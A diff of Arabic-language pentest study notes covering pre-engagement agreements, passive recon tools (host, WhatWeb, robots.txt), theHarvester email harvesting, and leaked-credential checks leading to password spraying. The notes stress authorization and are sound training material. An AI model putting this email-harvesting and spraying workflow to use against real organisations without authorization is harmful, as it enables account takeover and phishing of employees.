@@ -71,11 +71,6 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
-        
-        <a href="#_1" class="md-skip">
-          انتقل إلى المحتوى
-        </a>
-      
     </div>
     <div data-md-component="announce">
       
@@ -480,8 +475,6 @@
       <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
       
       
-        
-      
       
       <a href="./" class="md-nav__link md-nav__link--active">
         
@@ -521,8 +514,6 @@
   
   
   
-    
-  
   
 </nav>
                   </div>
@@ -539,1218 +530,3950 @@
 
 
 
-<p>1-Pre-Engagement Phase:</p>
-<p>1 # أولًا: يعني إيه Pre-Engagement Phase؟  </p>
-<p>ببساطة:  </p>
-<blockquote>
-<p>دي المرحلة اللي بتحصل قبل ما تبدأ الاختبار فعليًا.  </p>
-</blockquote>
-<p>يعني مش هتفتح Burp ولا Nmap ولا تعمل Scan…<br />
-إنت لسه بتتفق مع العميل على كل حاجة.  </p>
-<p>📌 الهدف منها:  </p>
-<ul>
-<li>تنظيم الشغل  </li>
-<li>تجنب المشاكل القانونية  </li>
-<li>تحديد إنت هتعمل إيه بالظبط  </li>
-</ul>
-<hr />
-<h1 id="_1">🧠 الفكرة الأساسية</h1>
-<p>الـ Pre-engagement =<br />
-"قعدة بينك وبين العميل تتفقوا فيها على كل التفاصيل قبل الهجوم"  </p>
-<hr />
-<h1 id="_2">🔵 العناصر الأساسية (زي ما الفيديو قال)</h1>
-<h2 id="1-objectives-goals">1️⃣ تحديد الأهداف (Objectives / Goals)</h2>
-<p>دي أول حاجة 👇  </p>
-<p>💬 تسأل العميل:  </p>
-<ul>
-<li>عايز إيه من الـ Pen Test؟  </li>
-<li>خايف من إيه؟  </li>
-<li>حصل Hack قبل كده؟  </li>
-</ul>
-<h3 id="_3">أمثلة:</h3>
-<ul>
-<li>عايز أعرف هل عندي SQL Injection ولا لا  </li>
-<li>عايز أختبر Login System  </li>
-<li>عايز أعمل Compliance (زي OWASP)  </li>
-</ul>
-<p>📌 دي أهم نقطة لأنها:<br />
-➡️ هي اللي بتحدد باقي كل حاجة  </p>
-<hr />
-<h2 id="2-scope">2️⃣ تحديد الـ Scope (النطاق)</h2>
-<p>بعد ما تعرف الهدف، تحدد:  </p>
-<blockquote>
-<p>"هتختبر إيه؟ ومش هتختبر إيه؟"  </p>
-</blockquote>
-<h3 id="_4">مثال:</h3>
-<p>✅ In Scope:  </p>
-<ul>
-<li>example.com  </li>
-<li>/login  </li>
-<li>/api  </li>
-</ul>
-<p>❌ Out of Scope:  </p>
-<ul>
-<li>payment system  </li>
-<li>production database  </li>
-</ul>
-<p>📌 مهم جدًا:<br />
-لو اشتغلت برا الـ scope = ممكن تدخل في مشاكل قانونية 💀  </p>
-<hr />
-<h2 id="3-timeline">3️⃣ Timeline (الوقت)</h2>
-<p>📅 بتحدد:  </p>
-<ul>
-<li>الاختبار هيبدأ إمتى؟  </li>
-<li>هيخلص إمتى؟  </li>
-<li>كل مرحلة هتاخد قد إيه؟  </li>
-</ul>
-<h3 id="_5">مثال:</h3>
-<ul>
-<li>Recon: يومين  </li>
-<li>Exploitation: 3 أيام  </li>
-<li>Report: يومين  </li>
-</ul>
-<hr />
-<h2 id="4-authorization">4️⃣ Authorization (التصريح القانوني)</h2>
-<p>دي أخطر نقطة 🔥  </p>
-<p>لازم يكون عندك:<br />
-📄 ورق رسمي إنك مسموحلك تعمل الاختبار  </p>
-<p>مين يوقع؟  </p>
-<ul>
-<li>CTO  </li>
-<li>CISO  </li>
-<li>صاحب السيستم  </li>
-</ul>
-<p>📌 بدون ده:<br />
-👉 إنت technically "هاكر" حتى لو نيتك كويسة  </p>
-<hr />
-<h2 id="5-rules-of-engagement">5️⃣ Rules of Engagement (قواعد اللعب)</h2>
-<p>دي القوانين اللي هتمشي عليها 👇  </p>
-<h3 id="_6">أمثلة:</h3>
-<ul>
-<li>❌ ممنوع تعمل DoS  </li>
-<li>❌ ممنوع تمسح بيانات  </li>
-<li>❌ ممنوع تستخدم Web Shell  </li>
-<li>✅ allowed بس read-only access  </li>
-</ul>
-<p>📌 دي بتحدد:<br />
-"إنت تقدر توصل لفين"  </p>
-<hr />
-<h2 id="6-deliverables">6️⃣ Deliverables (هتسلم إيه؟)</h2>
-<p>يعني العميل مستني منك إيه في الآخر  </p>
-<h3 id="_7">أمثلة:</h3>
-<ul>
-<li>تقرير بالثغرات  </li>
-<li>Proof of Concept  </li>
-<li>Risk level (High / Medium / Low)  </li>
-<li>Recommendations  </li>
-</ul>
-<p>📌 حتى لو مفيش ثغرات:<br />
-👉 لازم Report برضه  </p>
-<hr />
-<h2 id="7-communication">7️⃣ Communication (التواصل)</h2>
-<p>بتحدد:  </p>
-<ul>
-<li>هتتكلموا إزاي؟ (Slack / Teams)  </li>
-<li>لو حصل مشكلة تعمل إيه؟  </li>
-<li>في meetings ولا لا؟  </li>
-</ul>
-<p>📌 مهم جدًا عشان:  </p>
-<ul>
-<li>متكسرش السيستم بالغلط  </li>
-<li>تبلغهم بأي حاجة خطيرة فورًا  </li>
-</ul>
-<hr />
-<h2 id="8-nda-contracts">8️⃣ NDA &amp; Contracts (اتفاقيات)</h2>
-<p>📄 زي:  </p>
-<ul>
-<li>NDA (عدم إفشاء المعلومات)  </li>
-</ul>
-<p>📌 عشان:  </p>
-<ul>
-<li>تحمي بيانات الشركة  </li>
-<li>وتحمي نفسك قانونيًا  </li>
-</ul>
-<hr />
-<h2 id="9-scoping-meeting">9️⃣ Scoping Meeting (اجتماع مراجعة)</h2>
-<p>قبل ما تبدأ فعليًا:  </p>
-<p>💬 تقعدوا تاني وتتأكدوا:  </p>
-<ul>
-<li>ده الـ scope النهائي؟  </li>
-<li>في تعديل؟  </li>
-<li>كله متفق؟  </li>
-</ul>
-<hr />
-<h2 id="preparation">🔟 تجهيز الأدوات (Preparation)</h2>
-<p>بتجهز:  </p>
-<ul>
-<li>Burp Suite  </li>
-<li>Kali Linux  </li>
-<li>VPS (لو Black Box)  </li>
-<li>tools زي:  </li>
-<li>ffuf  </li>
-<li>sqlmap  </li>
-</ul>
-<p>📌 + تجهز Team بتاعك  </p>
-<hr />
-<h2 id="11-risk-assessment">1️⃣1️⃣ Risk Assessment (تقييم المخاطر)</h2>
-<p>بتسأل نفسك:  </p>
-<blockquote>
-<p>"هل ممكن أكسر السيستم وأنا بختبر؟"  </p>
-</blockquote>
-<h3 id="_8">مثال:</h3>
-<ul>
-<li>brute force ممكن يوقع السيرفر  </li>
-<li>fuzzing ممكن يعمل crash  </li>
-</ul>
-<p>📌 فبتتفق مع العميل:  </p>
-<ul>
-<li>لو حصل damage… مين المسؤول؟  </li>
-</ul>
-<hr />
-<h2 id="12-kickoff">1️⃣2️⃣ Kickoff (بداية الشغل)</h2>
-<p>🔥 هنا بس تبدأ فعليًا الاختبار  </p>
-<ul>
-<li>تحدد Start Date  </li>
-<li>كل الفريق يبقى فاهم rules  </li>
-<li>تبدأ pentest  </li>
-</ul>
-<hr />
-<h1 id="_9">⚠️ خلاصة مهمة جدًا</h1>
-<p>الـ Pre-Engagement مش كلام نظري…  </p>
-<p>ده بيحميك من:  </p>
-<ul>
-<li>❌ مشاكل قانونية  </li>
-<li>❌ تضييع وقت  </li>
-<li>❌ تدمير سيستم بالغلط  </li>
-<li>❌ سوء تفاهم مع العميل  </li>
-</ul>
-<hr />
-<h1 id="_10">🧩 الصورة الكاملة</h1>
-<p>Pre-Engagement<br />
-↓<br />
-Agreement + Planning<br />
-↓<br />
-Execution (Pentest)<br />
-↓<br />
-Reporting  </p>
-<hr />
-<h1 id="_11">💡 نصيحة ليك (مهمة جدًا في مجالك)</h1>
-<p>بما إنك شغال في Cybersecurity 👀  </p>
-<p>لو اشتغلت Freelance أو في شركة:<br />
-👉 80% من شغلك الحقيقي = Pre-engagement + Reporting<br />
-مش الهكر نفسه 😄</p>
-<p>2-website Recon &amp; Foot printing:</p>
-<p>2 # أولًا: يعني إيه Website Recon &amp; Footprinting؟  </p>
-<h2 id="reconnaissance-recon">🧠 Reconnaissance (Recon)</h2>
-<p>ده ببساطة:<br />
-جمع معلومات عن الهدف (Website) بدون ما تهاجمه  </p>
-<h2 id="footprinting">🧠 Footprinting</h2>
-<p>هو نفس الـ Recon تقريبًا<br />
-لكن بيركّز على:  </p>
-<blockquote>
-<p>المعلومات المهمة اللي تساعدك في الهجوم بعد كده  </p>
-</blockquote>
-<p>📌 يعني:  </p>
-<ul>
-<li>Recon = جمع معلومات بشكل عام  </li>
-<li>Footprinting = جمع معلومات “مفيدة للهجوم”  </li>
-</ul>
-<hr />
-<h1 id="passive-recon">🟢 Passive Recon (مهم جدًا)</h1>
-<p>ده اللي الفيديو بيتكلم عنه 👇  </p>
-<h2 id="passive">✅ يعني إيه Passive؟</h2>
-<p>إنك تجمع معلومات:  </p>
-<ul>
-<li>بدون ما تلمس السيرفر مباشرة (أو بأقل تفاعل)  </li>
-<li>بدون ما تسيب Logs واضحة  </li>
-</ul>
-<p>💡 مثال:  </p>
-<ul>
-<li>Google search  </li>
-<li>DNS lookup  </li>
-<li>قراءة ملفات public زي robots.txt  </li>
-</ul>
-<hr />
-<h1 id="_12">🎯 إيه المعلومات اللي بندور عليها؟</h1>
-<p>زي ما الفيديو قال، أهم الحاجات:  </p>
-<h3 id="1-ip-address">1. 🌐 IP Address</h3>
-<ul>
-<li>عشان تعرف السيرفر الحقيقي  </li>
-<li>تستخدمه بعد كده في scanning  </li>
-</ul>
-<hr />
-<h3 id="2-directories">2. 📁 Directories مخفية</h3>
-<ul>
-<li>زي:  </li>
-<li>/admin  </li>
-<li>/backup  </li>
-<li>/test  </li>
-</ul>
-<hr />
-<h3 id="3-emails-names-phones">3. 👤 Emails / Names / Phones</h3>
-<ul>
-<li>Social engineering  </li>
-<li>Password guessing  </li>
-</ul>
-<hr />
-<h3 id="4-web-technologies">4. ⚙️ Web Technologies</h3>
-<ul>
-<li>WordPress؟  </li>
-<li>PHP version؟  </li>
-<li>Plugins؟  </li>
-</ul>
-<p>💣 دي مهمة جدًا عشان:  </p>
-<blockquote>
-<p>تدور على vulnerabilities خاصة بالتقنية دي  </p>
-</blockquote>
-<hr />
-<h1 id="_13">🔧 شرح الأدوات اللي اتقالت</h1>
-<hr />
-<h2 id="1-host">1. 🖥️ أمر host</h2>
-<p>host example.com  </p>
-<p>💡 وظيفته:  </p>
-<ul>
-<li>يحول Domain → IP  </li>
-</ul>
-<h2 id="_14">🧠 ليه مهم؟</h2>
-<ul>
-<li>الإنترنت بيتعامل بالـ IP مش بالـ domain  </li>
-</ul>
-<hr />
-<h3 id="ip">⚠️ لو لقيت أكتر من IP؟</h3>
-<p>غالبًا:  </p>
-<ul>
-<li>الموقع ورا Proxy زي Cloudflare  </li>
-</ul>
-<p>💡 يعني:  </p>
-<blockquote>
-<p>أنت مش شايف السيرفر الحقيقي  </p>
-</blockquote>
-<hr />
-<h2 id="2-robotstxt">2. 📄 ملف robots.txt</h2>
-<p>توصله كده:  </p>
-<p>example.com/robots.txt  </p>
-<h2 id="_15">🧠 وظيفته:</h2>
-<p>يقول لمحركات البحث:  </p>
-<blockquote>
-<p>“ما تدخلش الأماكن دي”  </p>
-</blockquote>
-<h3 id="_16">مثال:</h3>
-<p>Disallow: /admin  </p>
-<p>💣 كمهاجم:  </p>
-<blockquote>
-<p>ده كنز 😈  </p>
-</blockquote>
-<p>ليه؟  </p>
-<ul>
-<li>لأنه بيكشف:  </li>
-<li>directories مخفية  </li>
-<li>admin panels  </li>
-</ul>
-<hr />
-<h2 id="3-sitemapxml">3. 🗺️ sitemap.xml</h2>
-<p>توصله:  </p>
-<p>example.com/sitemap.xml  </p>
-<h2 id="_17">🧠 وظيفته:</h2>
-<ul>
-<li>list بكل صفحات الموقع  </li>
-</ul>
-<h2 id="_18">🎯 فايدته ليك:</h2>
-<ul>
-<li>تلاقي pages مش موجودة في UI  </li>
-<li>تكتشف:  </li>
-<li>endpoints  </li>
-<li>hidden pages  </li>
-</ul>
-<hr />
-<h2 id="4-builtwith-browser-extension">4. 🧩 BuiltWith (Browser Extension)</h2>
-<h2 id="_19">بيعمل إيه؟</h2>
-<p>يقولك:  </p>
-<ul>
-<li>الموقع معمول بـ إيه  </li>
-</ul>
-<p>مثلاً:  </p>
-<ul>
-<li>WordPress  </li>
-<li>jQuery  </li>
-<li>PHP  </li>
-<li>Plugins  </li>
-</ul>
-<h2 id="_20">💣 مهم ليه؟</h2>
-<p>عشان:  </p>
-<blockquote>
-<p>تدور على exploits جاهزة  </p>
-</blockquote>
-<p>مثال:  </p>
-<ul>
-<li>WordPress version قديم → Vulnerable  </li>
-</ul>
-<hr />
-<h2 id="5-wappalyzer">5. 🧩 Wappalyzer</h2>
-<p>نفس فكرة BuiltWith<br />
-بس أحيانًا أدق أو أسرع  </p>
-<hr />
-<h2 id="6-whatweb-kali">6. 🖥️ أداة WhatWeb (في Kali)</h2>
-<p>whatweb example.com  </p>
-<h2 id="_21">🔥 بيطلعلك:</h2>
-<ul>
-<li>السيرفر (Apache/Nginx)  </li>
-<li>PHP version  </li>
-<li>CMS (WordPress)  </li>
-<li>Plugins  </li>
-<li>Headers  </li>
-</ul>
-<p>💡 ده كنز حرفيًا 👀  </p>
-<hr />
-<h2 id="7-httrack">7. 📥 HTTrack (تحميل الموقع)</h2>
-<h2 id="_22">بيعمل إيه؟</h2>
-<ul>
-<li>يحمل الموقع كامل على جهازك  </li>
-</ul>
-<h2 id="_23">💣 ليه مهم؟</h2>
-<ul>
-<li>تفحص:  </li>
-<li>Source code براحتك  </li>
-<li>JavaScript  </li>
-<li>hidden endpoints  </li>
-</ul>
-<hr />
-<h1 id="_24">⚠️ نقطة مهمة جدًا (امتحان + شغل حقيقي)</h1>
-<h2 id="_25">الفرق بين:</h2>
-<h3 id="passive-vs-active-recon">Passive vs Active Recon</h3>
-<table>
-<thead>
-<tr>
-<th>النوع</th>
-<th>بيعمل إيه</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Passive</td>
-<td>بدون interaction مباشر</td>
-</tr>
-<tr>
-<td>Active</td>
-<td>بيبعت requests (زي Nmap)</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h1 id="flow">🧠 Flow تمشي عليه في أي موقع</h1>
-<p>لو جالك Target 👇  </p>
-<h2 id="step-1">Step 1:</h2>
-<p>host target.com  </p>
-<h2 id="step-2">Step 2:</h2>
-<p>/robots.txt<br />
-/sitemap.xml  </p>
-<h2 id="step-3">Step 3:</h2>
-<ul>
-<li>BuiltWith أو Wappalyzer  </li>
-</ul>
-<h2 id="step-4">Step 4:</h2>
-<p>whatweb target.com  </p>
-<h2 id="step-5">Step 5:</h2>
-<ul>
-<li>Google dorking (لو عايز تبقى برو 🔥)  </li>
-</ul>
-<hr />
-<h1 id="tips">🔥 Tips من خبرة (دي اللي تفرقك)</h1>
-<p>✅ دايمًا:  </p>
-<ul>
-<li>robots.txt = أول حاجة تبص عليها  </li>
-<li>sitemap.xml = كنز hidden pages  </li>
-</ul>
-<p>✅ لو لقيت:  </p>
-<ul>
-<li>WordPress → روح على:  </li>
-<li>wp-admin  </li>
-<li>plugins vulnerabilities  </li>
-</ul>
-<p>✅ لو الموقع ورا Cloudflare:  </p>
-<ul>
-<li>IP اللي طلع → مش الحقيقي غالبًا  </li>
-</ul>
-<hr />
-<h1 id="_26">💬 خلاصة سريعة</h1>
-<blockquote>
-<p>Recon = تعرف كل حاجة عن الهدف<br />
-Footprinting = تركز على اللي يفيدك في الاختراق  </p>
-</blockquote>
-<p>و Passive Recon:  </p>
-<blockquote>
-<p>أهم مرحلة… لأنها “ساكتة” ومش بتكشفك</p>
-</blockquote>
-<p>3-Email Harvesting with TheHarvester:<br />
-<a href="#fn-1">[1]</a>: ### Email Harvesting  </p>
-<p>يعني: <strong>تجميع إيميلات خاصة بدومين معين (target)</strong>  </p>
-<p>مثال:  </p>
-<p>target = example.com  </p>
-<p>أنت هدفك تطلع:  </p>
-<ul>
-<li>emails → <a href="mailto:admin@example.com">admin@example.com</a>  </li>
-<li>موظفين  </li>
-<li>usernames  </li>
-<li>subdomains  </li>
-</ul>
-<hr />
-<h2 id="pentesting">🧠 ليه ده مهم في الـ Pentesting؟</h2>
-<p>الإيميلات دي بتستخدمها في:  </p>
-<ul>
-<li>🎯 Phishing attacks  </li>
-<li>🎯 Brute force / password spraying  </li>
-<li>🎯 Social engineering  </li>
-<li>🎯 معرفة structure الشركة (مين شغال فين)  </li>
-</ul>
-<hr />
-<h2 id="recon">🔵 نوع الـ Recon هنا</h2>
-<p>الفيديو أكد على نقطة مهمة:  </p>
-<h3 id="passive-recon-osint">🔹 Passive Recon (OSINT)</h3>
-<p>يعني:  </p>
-<ul>
-<li>مش بتهاجم السيرفر  </li>
-<li>مش بتبعت requests مباشرة للtarget  </li>
-<li>بتجمع من <strong>مصادر عامة</strong>  </li>
-</ul>
-<p>زي:  </p>
-<ul>
-<li>Google  </li>
-<li>Bing  </li>
-<li>LinkedIn  </li>
-<li>GitHub leaks  </li>
-</ul>
-<hr />
-<h2 id="theharvester">🟡 الأداة الأساسية: theHarvester</h2>
-<h3 id="_27">💡 هي إيه؟</h3>
-<p>Tool موجودة في Kali Linux بتعمل:  </p>
-<ul>
-<li>Email gathering  </li>
-<li>Subdomains  </li>
-<li>IPs  </li>
-<li>أسماء موظفين  </li>
-</ul>
-<hr />
-<h2 id="_28">⚙️ بتشتغل إزاي؟</h2>
-<p>الأداة <strong>مش بتخترق</strong><br />
-هي بس:  </p>
-<blockquote>
-<p>بتسأل search engines + databases وتجمع النتائج  </p>
-</blockquote>
-<hr />
-<h2 id="data-sources">🧰 مصادر البيانات (Data Sources)</h2>
-<p>دي أهم نقطة في قوة الأداة:  </p>
-<p>كل ما تزود sources → النتائج تزيد  </p>
-<p>أمثلة:  </p>
-<ul>
-<li>google  </li>
-<li>bing  </li>
-<li>yahoo  </li>
-<li>linkedin  </li>
-<li>hunter.io  </li>
-<li>crt.sh (شهادات SSL)  </li>
-</ul>
-<hr />
-<h2 id="practical">🔧 استخدام الأداة (Practical)</h2>
-<h3 id="_29">📌 الأمر الأساسي:</h3>
-<p>uv run theHarvester -d target.com -b google  </p>
-<h3 id="_30">شرح:</h3>
-<ul>
-<li>-d → الدومين  </li>
-<li>-b → المصدر (source)  </li>
-</ul>
-<hr />
-<h2 id="_31">🧪 مثال حقيقي:</h2>
-<p>uv run theHarvester -d tesla.com -b google  </p>
-<p>هيطلع:  </p>
-<ul>
-<li>emails  </li>
-<li>subdomains  </li>
-<li>hosts  </li>
-</ul>
-<hr />
-<h2 id="source">🔄 استخدام أكثر من source</h2>
-<p>uv run theHarvester -d target.com -b all  </p>
-<p>🔥 ده مهم جدًا لأنه:  </p>
-<ul>
-<li>بيجمع من كل المصادر  </li>
-<li>بيزود coverage  </li>
-</ul>
-<hr />
-<h2 id="_32">📊 تحديد عدد النتائج</h2>
-<p>uv run theHarvester -d target.com -b google -l 100  </p>
-<ul>
-<li>-l → limit (عدد النتائج)  </li>
-</ul>
-<hr />
-<h2 id="_33">📁 حفظ النتائج</h2>
-<p>uv run theHarvester -d target.com -b google -f output  </p>
-<p>هيعمل:  </p>
-<ul>
-<li>ملف HTML  </li>
-<li>ملف XML  </li>
-</ul>
-<p>💡 مفيد جدًا لو هتستخدمه في:  </p>
-<ul>
-<li>reporting  </li>
-<li>automation  </li>
-</ul>
-<hr />
-<h2 id="_34">🧠 ملاحظات مهمة من الفيديو</h2>
-<h3 id="1">1️⃣ الأداة قوية بس…</h3>
-<p>قوتها تعتمد على:  </p>
-<blockquote>
-<p><strong>المصادر اللي بتستخدمها</strong>  </p>
-</blockquote>
-<hr />
-<h3 id="2-pentest">2️⃣ دي مرحلة بدري في الـ Pentest</h3>
-<p>بتستخدمها في:  </p>
-<blockquote>
-<p>Recon Phase (قبل أي استغلال)  </p>
-</blockquote>
-<hr />
-<h3 id="3">3️⃣ شبه أدوات تانية</h3>
-<p>الفيديو قال إنها شبه:  </p>
-<ul>
-<li>subdomain tools زي sublist3r  </li>
-</ul>
-<hr />
-<h2 id="limitations">⚠️ Limitations</h2>
-<ul>
-<li>مش هتجيب كل الإيميلات  </li>
-<li>بيعتمد على leaks + public data  </li>
-<li>أحيانًا فيه false positives  </li>
-</ul>
-<hr />
-<h2 id="pentester">🧩 إزاي تربطها بشغلك كـ Pentester</h2>
-<p>أنت ممكن تعمل workflow زي ده:  </p>
-<ol>
-<li>theHarvester  </li>
-<li>تجيب emails  </li>
-<li>تعمل:  </li>
-<li>Password spraying  </li>
-<li>Phishing simulation  </li>
-<li>أو تستخدمها مع tools زي:  </li>
-<li>Nmap (للسيرفرات)  </li>
-<li>Burp Suite (للويب)  </li>
-</ol>
-<hr />
-<h2 id="_35">🔥 الخلاصة</h2>
-<p>الأداة:  </p>
-<blockquote>
-<p>"عينك على الإنترنت"  </p>
-</blockquote>
-<p>مش بتكسر حاجة، بس:  </p>
-<ul>
-<li>بتشوف إيه متسرب  </li>
-<li>إيه ظاهر للناس  </li>
-<li>وإيه ممكن تستغله</li>
-</ul>
-<p>4-Leaked Passwords Database :<br />
-<a href="#fn-1">[1-1]</a>: Leaked Password Databases  </p>
-<p>يعني:  </p>
-<blockquote>
-<p>قواعد بيانات فيها <strong>إيميلات + باسوردات اتسربت من اختراقات</strong> <strong>(Data Breaches)</strong>  </p>
-</blockquote>
-<hr />
-<h1 id="_36">🟡 الهدف من الكلام ده</h1>
-<p>إنت في الفيديو اللي قبله:  </p>
-<ul>
-<li>استخدمت <strong>theHarvester</strong>  </li>
-<li>وطلعت emails لموظفين شركة  </li>
-</ul>
-<p>📌 دلوقتي بقى السؤال:  </p>
-<blockquote>
-<p>هل الإيميلات دي اتسربت قبل كده؟ 👀  </p>
-</blockquote>
-<hr />
-<h1 id="_37">🔵 الأداة الأساسية هنا</h1>
-<h2 id="have-i-been-pwned">🌐 Have I Been Pwned</h2>
-<h3 id="_38">💡 دي بتعمل إيه؟</h3>
-<ul>
-<li>موقع بيجمع كل الـ <strong>data breaches</strong> في العالم  </li>
-<li>تقدر تحط:  </li>
-<li>Email  </li>
-<li>أو رقم موبايل  </li>
-<li>يقولك:  </li>
-<li>هل اتسرب ولا لأ  </li>
-<li>واتسرب من أنهي موقع  </li>
-</ul>
-<hr />
-<h1 id="_39">🧪 مثال بسيط</h1>
-<p>لو حطيت:  </p>
-<p><a href="mailto:test@example.com">test@example.com</a>  </p>
-<p>هيقولك:  </p>
-<ul>
-<li>❌ Not found → تمام  </li>
-<li>✅ Found → الإيميل ده اتسرب قبل كده  </li>
-</ul>
-<hr />
-<h1 id="pentest">🔥 السيناريو الحقيقي في الـ Pentest</h1>
-<p>خلينا نمشيها step by step:  </p>
-<h2 id="1-emails">1️⃣ تجمع Emails</h2>
-<p>باستخدام:  </p>
-<ul>
-<li>theHarvester  </li>
-</ul>
-<hr />
-<h2 id="2">2️⃣ تدخلهم في الموقع</h2>
-<p>تشوف:  </p>
-<ul>
-<li>مين منهم اتسرب  </li>
-</ul>
-<hr />
-<h2 id="3_1">3️⃣ لو اتسرب 👀</h2>
-<p>يبقى:  </p>
-<ul>
-<li>في احتمال كبير إن:  </li>
-<li>الباسورد اتسرب  </li>
-<li>أو على الأقل الحساب اتأثر  </li>
-</ul>
-<hr />
-<h1 id="_40">⚠️ نقطة خطيرة جدًا</h1>
-<p>الفيديو ركز عليها:  </p>
-<h2 id="password-reuse">🔴 Password Reuse</h2>
-<p>يعني:  </p>
-<blockquote>
-<p>الشخص بيستخدم نفس الباسورد في أكتر من موقع  </p>
-</blockquote>
-<hr />
-<h3 id="_41">مثال:</h3>
-<p>واحد عنده:  </p>
-<p>email: <a href="mailto:ahmed@gmail.com">ahmed@gmail.com</a><br />
-password: 123456  </p>
-<p>اتسرب من:  </p>
-<ul>
-<li>موقع قديم  </li>
-</ul>
-<p>لكن هو لسه بيستخدم نفس الباسورد في:  </p>
-<ul>
-<li>Facebook  </li>
-<li>Gmail  </li>
-<li>LinkedIn  </li>
-</ul>
-<p>💥 هنا الكارثة:  </p>
-<blockquote>
-<p>كل حساباته ممكن تتفتح بنفس الباسورد  </p>
-</blockquote>
-<hr />
-<h1 id="_42">🟣 الهجوم المرتبط بالكلام ده</h1>
-<h2 id="password-spraying">🎯 Password Spraying</h2>
-<p>يعني:  </p>
-<ul>
-<li>عندك list إيميلات  </li>
-<li>وعندك باسورد مسرب  </li>
-<li>تجرب نفس الباسورد على كل الإيميلات  </li>
-</ul>
-<hr />
-<p>📌 مثال:  </p>
-<p>emails:<br />
-- <a href="mailto:user1@company.com">user1@company.com</a><br />
-- <a href="mailto:user2@company.com">user2@company.com</a>  </p>
-<p>password:<br />
-- leaked123  </p>
-<p>تجرب:  </p>
-<ul>
-<li>نفس الباسورد على كل الحسابات  </li>
-</ul>
-<hr />
-<h1 id="passive-recon_1">🟢 ليه ده لسه Passive Recon؟</h1>
-<p>الفيديو قال نقطة مهمة:  </p>
-<blockquote>
-<p>❗ إحنا لسه في Passive Phase  </p>
-</blockquote>
-<p>يعني:  </p>
-<ul>
-<li>مش بنهاجم  </li>
-<li>مش بنعمل login attempts  </li>
-<li>بس <strong>بنجمع معلومات</strong>  </li>
-</ul>
-<hr />
-<h1 id="_43">🟠 ليه الموقع ده مهم جدًا؟</h1>
-<h2 id="_44">لأنه:</h2>
-<ul>
-<li>بيختصر وقت رهيب  </li>
-<li>بدل ما تدور في leaks بنفسك  </li>
-<li>هو مجمع كل حاجة  </li>
-</ul>
-<hr />
-<h1 id="_45">🧠 معلومة جامدة</h1>
-<p>الموقع معمول بواسطة:  </p>
-<h2 id="troy-hunt">👤 Troy Hunt</h2>
-<p>واحد من أشهر الناس في مجال:  </p>
-<ul>
-<li>Data breaches  </li>
-<li>Security awareness  </li>
-</ul>
-<hr />
-<h1 id="_46">🔍 إيه المعلومات اللي بتظهر؟</h1>
-<p>مش دايمًا بيظهر الباسورد مباشرة ❌<br />
-لكن ممكن يظهر:  </p>
-<ul>
-<li>الموقع اللي اتسرب منه  </li>
-<li>نوع البيانات:  </li>
-<li>email  </li>
-<li>password  </li>
-<li>phone  </li>
-<li>username  </li>
-</ul>
-<hr />
-<h1 id="passwords">⚠️ ليه الفيديو ما عرضش passwords؟</h1>
-<p>قالك:  </p>
-<blockquote>
-<p>❌ لأسباب أخلاقية (Ethics)  </p>
-</blockquote>
-<p>لأن:  </p>
-<ul>
-<li>دي بيانات حساسة  </li>
-<li>مش المفروض تستخدمها بشكل مباشر  </li>
-</ul>
-<hr />
-<h1 id="_47">🔴 خطورة الموضوع</h1>
-<p>الفيديو قال حاجة مهمة جدًا:  </p>
-<blockquote>
-<p>معظم الناس أصلاً مش عارفة إن بياناتها اتسربت  </p>
-</blockquote>
-<hr />
-<h1 id="pentester_1">🧠 كـ Pentester المفروض تفكر إزاي؟</h1>
-<h2 id="_48">السيناريو المثالي:</h2>
-<ol>
-<li>تستخدم theHarvester  </li>
-<li>تجيب emails  </li>
-<li>تستخدم Have I Been Pwned  </li>
-<li>تشوف:  </li>
-<li>مين exposed  </li>
-<li>تكتب في التقرير:  </li>
-</ol>
-<h3 id="finding">📝 Finding:</h3>
-<ul>
-<li>Employees using compromised credentials  </li>
-</ul>
-<h3 id="recommendation">🛠 Recommendation:</h3>
-<ul>
-<li>Password reset  </li>
-<li>Enable MFA  </li>
-<li>Security awareness  </li>
-</ul>
-<hr />
-<h1 id="_49">🔥 نقطة جامدة جدًا في الفيديو</h1>
-<blockquote>
-<p>"Not a lot of pentesters do this… but experienced ones do"  </p>
-</blockquote>
-<p>يعني:<br />
-💡 الحركة دي بتفرق بين:  </p>
-<ul>
-<li>Beginner  </li>
-<li>وواحد فاهم بجد  </li>
-</ul>
-<hr />
-<h1 id="_50">🟢 الخلاصة</h1>
-<p>الفيديو بيقولك:  </p>
-<blockquote>
-<p>🧠 "الإيميل لوحده مش كفاية… شوف تاريخه"  </p>
-</blockquote>
-<p>يعني:  </p>
-<ul>
-<li>هل اتسرب؟  </li>
-<li>هل ممكن يتستغل؟  </li>
-<li>هل صاحبه بيكرر الباسورد؟</li>
-</ul>
-<p>5-Web app fingerprinting :</p>
-<hr />
-<ol>
-<li><strong>أولاً: يعني إيه Web App Fingerprinting</strong><strong>؟</strong></li>
-</ol>
-<p><strong>🔴</strong> <strong>التعريف</strong></p>
-<p>تحديد التقنيات (Technologies) اللي الموقع شغال بيها</p>
-<p>يعني تعرف:</p>
-<ul>
-<li>بيستخدم إيه CMS؟ (WordPress؟)</li>
-<li>اللغة؟ (PHP؟ Python؟)</li>
-<li>السيرفر؟ (Apache؟ Nginx؟)</li>
-<li>Plugins / Libraries؟</li>
-</ul>
-<hr />
-<p><strong>🧠</strong> <strong>الهدف</strong></p>
-<p>قبل ما تهاجم:</p>
-<p>لازم تعرف <strong>بتهاجم إيه أصلاً</strong></p>
-<p>💡 مثال:</p>
-<ul>
-<li>WordPress → ليه vulnerabilities معروفة</li>
-<li>PHP version قديم → ممكن RCE</li>
-<li>Plugin معين → فيه exploit جاهز</li>
-</ul>
-<hr />
-<p><strong>🟡</strong> <strong>نوع الفحص هنا</strong></p>
-<p><strong>✅ Passive Fingerprinting</strong></p>
-<p>يعني:</p>
-<ul>
-<li>❌ مفيش هجوم مباشر</li>
-<li>❌ مفيش brute force</li>
-<li>✅ مجرد تحليل من اللي ظاهر</li>
-</ul>
-<hr />
-<p><strong>🧰</strong> <strong>الأدوات اللي اتكلم عنها الفيديو</strong></p>
-<p>هنقسمهم 3 أنواع:</p>
-<hr />
-<p><strong>🔵 1. Browser Extensions</strong></p>
-<p><strong>🌐 BuiltWith</strong></p>
-<p><strong>💡</strong> <strong>بيعمل إيه؟</strong></p>
-<ul>
